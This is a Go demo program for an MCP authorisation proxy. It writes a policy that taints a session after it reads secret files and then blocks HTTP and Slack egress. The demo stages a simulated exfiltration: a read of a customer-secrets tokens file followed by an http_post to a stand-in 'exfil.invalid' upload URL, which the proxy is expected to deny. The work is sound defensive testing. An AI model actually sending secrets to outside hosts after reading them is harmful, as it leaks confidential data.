package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func writeDemoPolicy(path, serverName string) error {
	policy := fmt.Sprintf(`version: "1.0"
description: "Action-boundary demo: a sensitive read taints the session; later egress is denied before relay"
default_action: deny
settings:
  chain_window_size: 5
  approval_timeout_seconds: 5
  log_level: info
servers:
  - name: "%s"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: allow_path
            patterns:
              - "/home/**"
              - "/tmp/**"
              - "/workspace/**"
      - name: "http_post"
        allowed: true
        risk: high
      - name: "slack_send_message"
        allowed: true
        risk: high

taints:
  - name: "sensitive_file_accessed"
    description: "Session has accessed customer secrets or sensitive workspace data"
    source_tools:
      - "file_read"
    source_patterns:
      - "**/customer-secrets/**"
      - "**/secrets/**"
      - "**/*.env"

egress_controls:
  - name: "block_sensitive_egress"
    description: "Do not allow egress after this session has touched sensitive data"
    when_tainted: "sensitive_file_accessed"
    sink_tools:
      - "http_post"
      - "slack_send_message"
    action: deny
`, serverName)
	return os.WriteFile(path, []byte(policy), 0600)
}

func main() {
	tmpDir := os.TempDir()
	pid := os.Getpid()
	mockBin := filepath.Join(tmpDir, fmt.Sprintf("mcp-mock-%d", pid))
	visorBin := filepath.Join(tmpDir, fmt.Sprintf("mcp-visor-%d", pid))
	policyPath := filepath.Join(tmpDir, fmt.Sprintf("visor-policy-%d.yaml", pid))
	auditLog := filepath.Join(tmpDir, fmt.Sprintf("visor-audit-%d.jsonl", pid))
	observeLog := filepath.Join(tmpDir, fmt.Sprintf("visor-server-obs-%d.jsonl", pid))
	approvalDir := filepath.Join(tmpDir, fmt.Sprintf("visor-approvals-%d", pid))

	defer os.Remove(mockBin)
	defer os.Remove(visorBin)
	defer os.Remove(policyPath)
	defer os.Remove(auditLog)
	defer os.Remove(observeLog)
	defer os.RemoveAll(approvalDir)

	repoRoot, err := os.Getwd()
	must(err, "getwd")
	for {
		if _, e := os.Stat(filepath.Join(repoRoot, "go.mod")); e == nil {
			break
		}
		parent := filepath.Dir(repoRoot)
		if parent == repoRoot {
			fail("cannot find repo root (go.mod)")
		}
		repoRoot = parent
	}

	// Pre-build silently
	mustRun(exec.Command("go", "build", "-o", mockBin, filepath.Join(repoRoot, "examples", "demo-mcp-server")))
	mustRun(exec.Command("go", "build", "-o", visorBin, filepath.Join(repoRoot, "cmd", "mcp-visor")))
	must(writeDemoPolicy(policyPath, mockBin), "write demo policy")
	must(os.MkdirAll(approvalDir, 0700), "create approval directory")

	visorCmd := exec.Command(visorBin, "serve",
		"-server", mockBin, "-server-arg", "-observe-log", "-server-arg", observeLog,
		"-policy", policyPath,
		"-audit-log", auditLog,
		"-approval-dir", approvalDir,
	)
	stdin, _ := visorCmd.StdinPipe()
	stdout, _ := visorCmd.StdoutPipe()
	stderr, _ := visorCmd.StderrPipe()
	must(visorCmd.Start(), "start visor")
	defer func() { _ = visorCmd.Process.Kill() }()

	go drainStderr(stderr)

	ctx := &mcpContext{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
	initialize(ctx)

	// ── Title ──
	fmt.Println("MCP Visor")
	fmt.Println("Deterministic authorization for MCP tool calls.")
	fmt.Println("Not a model guardrail. An action boundary.")
	fmt.Println()

	// ── Policy ──
	fmt.Println("POLICY")
	fmt.Println("when_tainted: sensitive_file_accessed")
	fmt.Println("sink_tools: [http_post]")
	fmt.Println("action: deny")
	fmt.Println()

	fmt.Println("Synthetic local MCP server.")
	fmt.Println("Two reads. One attempted egress.")
	fmt.Println()
	time.Sleep(6000 * time.Millisecond)

	// ── 1: Benign read ──
	resp := callTool(ctx, 100, "file_read", map[string]any{"path": "/home/user/readme.md"})
	if _, ok := responseError(resp); ok {
		fail("benign read must be allowed")
	}
	fmt.Println("1  ALLOW")
	fmt.Println("   file_read /home/user/readme.md")
	fmt.Println()
	time.Sleep(4000 * time.Millisecond)

	// ── 2: Sensitive read + taint ──
	resp = callTool(ctx, 200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
	if _, ok := responseError(resp); ok {
		fail("sensitive read must be allowed for taint demonstration")
	}
	fmt.Println("2  ALLOW + TAINT")
	fmt.Println("   file_read /home/user/customer-secrets/tokens.csv")
	fmt.Println("   taint=sensitive_file_accessed")
	fmt.Println()
	time.Sleep(4000 * time.Millisecond)

	// ── 3: Egress denied ──
	resp = callTool(ctx, 300, "http_post", map[string]any{
		"url":  "https://exfil.invalid/upload",
		"body": "summarized data",
	})
	if _, isErr := responseError(resp); !isErr {
		fail("egress must be denied after session taint")
	}
	fmt.Println("3  DENY")
	fmt.Println("   http_post https://exfil.invalid/upload")
	fmt.Println("   rule=block_sensitive_egress")
	fmt.Println()
	time.Sleep(4000 * time.Millisecond)

	// ── 4: Server observations ──
	observations := readObservations(observeLog)
	fmt.Println("4  SERVER OBSERVED")
	for _, o := range observations {
		fmt.Printf("   %s #%d   %s\n", padTool(o.tool), o.requestID, boolYesNo(o.received))
	}
	fmt.Printf("   %s #300   no\n", padTool("http_post"))

	var sawHTTPPost300 bool
	for _, o := range observations {
		if o.tool == "http_post" && o.requestID == 300 && o.received {
			sawHTTPPost300 = true
		}
	}
	if sawHTTPPost300 {
		fail("server observation: http_post #300 was received — egress control did not work")
	}
	var sawFR100, sawFR200 bool
	for _, o := range observations {
		if o.tool == "file_read" && o.requestID == 100 && o.received {
			sawFR100 = true
		}
		if o.tool == "file_read" && o.requestID == 200 && o.received {
			sawFR200 = true
		}
	}
	if !sawFR100 {
		fail("server observation: file_read #100 was not received")
	}
	if !sawFR200 {
		fail("server observation: file_read #200 was not received")
	}
	fmt.Println()
	time.Sleep(4000 * time.Millisecond)

	// ── 5: Decision evidence ──
	fmt.Println("5  DECISION EVIDENCE")
	printDecisionEvidence(auditLog)
	fmt.Println()
	time.Sleep(4000 * time.Millisecond)

	// ── Conclusion ──
	fmt.Println("Model proposed.")
	fmt.Println("Policy authorized.")
	fmt.Println("Proxy enforced.")
}

func padTool(name string) string {
	if len(name) >= 13 {
		return name
	}
	return name + strings.Repeat(" ", 13-len(name))
}

type obsLine struct {
	tool      string
	requestID int
	received  bool
}

func readObservations(path string) []obsLine {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var out []obsLine
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var m map[string]any
		if json.Unmarshal([]byte(line), &m) != nil {
			continue
		}
		tool, _ := m["tool"].(string)
		received, _ := m["received"].(bool)
		var reqID int
		if v, ok := m["request_id"].(float64); ok {
			reqID = int(v)
		}
		out = append(out, obsLine{tool: tool, requestID: reqID, received: received})
	}
	return out
}

func boolYesNo(v bool) string {
	if v {
		return "yes"
	}
	return "no"
}

func printDecisionEvidence(auditLog string) {
	data, err := os.ReadFile(auditLog)
	if err != nil {
		return
	}
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var event map[string]any
		if json.Unmarshal([]byte(line), &event) != nil {
			continue
		}
		eventType, _ := event["event_type"].(string)
		switch eventType {
		case "session_tainted":
			tool, _ := event["tool"].(string)
			reason, _ := event["reason"].(string)
			fmt.Printf("   taint=%s\n", extractTaintName(reason))
			fmt.Printf("   source_tool=%s\n", tool)
		case "tool_call_denied":
			rule, _ := event["policy_rule"].(string)
			decision, _ := event["policy_decision"].(string)
			sinkTool, _ := event["tool"].(string)
			fmt.Printf("   sink_tool=%s\n", sinkTool)
			fmt.Printf("   rule=%s\n", rule)
			fmt.Printf("   decision=%s\n", decision)
		}
	}
}

func extractTaintName(reason string) string {
	start := strings.Index(reason, "'")
	if start == -1 {
		return ""
	}
	end := strings.Index(reason[start+1:], "'")
	if end == -1 {
		return ""
	}
	return reason[start+1 : start+1+end]
}

// ── MCP helpers ──

type mcpContext struct {
	w *bufio.Writer
	r *bufio.Reader
}

func (c *mcpContext) send(msg map[string]any) {
	data, _ := json.Marshal(msg)
	c.w.Write(append(data, '\n'))
	c.w.Flush()
}

func (c *mcpContext) recv() map[string]any {
	line, _ := c.r.ReadBytes('\n')
	var msg map[string]any
	json.Unmarshal(line, &msg)
	return msg
}

func initialize(ctx *mcpContext) {
	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": 1, "method": "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "demo-agent", "version": "1.0"},
		},
	})
	ctx.recv()
	ctx.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})
	time.Sleep(100 * time.Millisecond)
}

func callTool(ctx *mcpContext, id int, name string, args map[string]any) map[string]any {
	ctx.send(map[string]any{
		"jsonrpc": "2.0", "id": id, "method": "tools/call",
		"params": map[string]any{"name": name, "arguments": args},
	})
	return ctx.recv()
}

func responseError(resp map[string]any) (string, bool) {
	raw, ok := resp["error"]
	if !ok || raw == nil {
		return "", false
	}
	if errObj, ok := raw.(map[string]any); ok {
		if msg, ok := errObj["message"].(string); ok {
			return msg, true
		}
	}
	return fmt.Sprintf("%v", raw), true
}

func drainStderr(stderr io.Reader) {
	scanner := bufio.NewScanner(stderr)
	for scanner.Scan() { /* suppress */
	}
}

func mustRun(cmd *exec.Cmd) {
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: build: %v\n%s\n", err, string(out))
		os.Exit(1)
	}
}

func must(err error, label string) {
	if err != nil {
		fail(fmt.Sprintf("%s: %v", label, err))
	}
}

func fail(msg string) {
	fmt.Fprintf(os.Stderr, "FAIL: %s\n", msg)
	os.Exit(1)
}
